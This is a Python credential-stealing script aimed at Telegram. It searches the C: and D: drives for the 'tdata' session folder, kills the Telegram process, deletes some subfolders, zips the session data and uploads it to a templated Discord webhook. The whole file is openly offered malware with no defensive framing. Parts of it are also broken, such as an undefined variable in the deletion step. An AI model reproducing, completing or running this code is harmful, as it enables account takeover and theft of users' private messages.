import os
import time
from discord_webhook import DiscordWebhook, DiscordEmbed
from zipfile import ZipFile, ZIP_DEFLATED
import zipfile
import shutil

#search folder
folder_name = 'tdata'

search_pathD = 'D:\\'
search_pathC = 'C:\\'

found = False
for root, dirs, files in os.walk(search_pathD):
    if folder_name in dirs:
        found = True
        full_path = os.path.join(root, folder_name)

for root, dirs, files in os.walk(search_pathC):
    if folder_name in dirs:
        found = True
        full_path = os.path.join(root, folder_name)

home = os.path.expanduser('~')
user = os.path.join(full_path) 
hook = "{{HOOK}}"
#search folder end

def task_kill():
    os.system('taskkill /f /im Telegram.exe')

def delete_fold():
    folder_path1 = os.path.join(user, 'user_data')
    folder_path2 = os.path.join(user, 'emoji')
    time.sleep(2)
    if os.path.isdir(folder_path) == True:
        shutil.rmtree(folder_path1)
        shutil.rmtree(folder_path2)

def archivation():
    with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
        for root, dirs, files in os.walk(user):
            for file in files:
                file_path = os.path.join(root, file)
                archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))

def discord_send():
    webhook = DiscordWebhook(url=hook)
    with open("tdata.zip", 'rb') as f:
        webhook.add_file(file=f.read(), filename='tdata_session.zip')
    webhook.execute()

def main():
    task_kill()
    delete_fold()
    archivation()
    discord_send()
main()
